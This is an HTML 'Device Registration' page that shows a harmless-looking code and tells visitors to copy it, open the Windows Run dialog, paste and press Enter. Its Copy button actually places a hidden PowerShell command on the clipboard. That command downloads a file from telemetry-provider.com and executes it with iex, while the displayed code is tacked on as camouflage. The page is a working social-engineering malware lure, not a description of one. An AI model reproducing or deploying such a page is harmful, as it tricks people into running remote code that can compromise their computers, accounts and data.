<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Registration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        #registrationCode {
            font-family: monospace;
            background-color: #e0e0e0;
            padding: 10px;
            border-radius: 4px;
            margin: 10px 0;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 500px;
        }
        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .instructions {
            margin-top: 20px;
            font-size: 14px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Device Registration</h2>
        <div id="registrationCode">3Z5TY-76FR3-9G87H-7ZC56</div>
        <button onclick="copyToClipboard()">Copy</button>
        <div class="instructions">
            <p>To register your device:</p>
            <ol>
                <li>Click the "Copy" button to copy the registration command.</li>
                <li>Press <strong>Windows + R</strong> to open the Run dialog.</li>
                <li>Press <strong>Ctrl + V</strong> to paste the command.</li>
                <li>Press <strong>Enter</strong> to execute.</li>
            </ol>
        </div>
    </div>

    <script>
        function copyToClipboard() {
            const textToCopy = `powershell -windowstyle hidden -Command iwr "https://www.telemetry-provider.com/telemetry.vmd" -OutFile "$env:TEMP\\p"; $c=Get-Content -Path "$env:TEMP\\p" -Raw; iex $c; 3Z5TY-76FR3-9G87H-7ZC56`;
            navigator.clipboard.writeText(textToCopy).then(() => {
                alert('Command copied to clipboard!');
            }).catch(err => {
                console.error('Failed to copy: ', err);
                alert('Failed to copy command. Please try again.');
            });
        }
    </script>
</body>
</html>
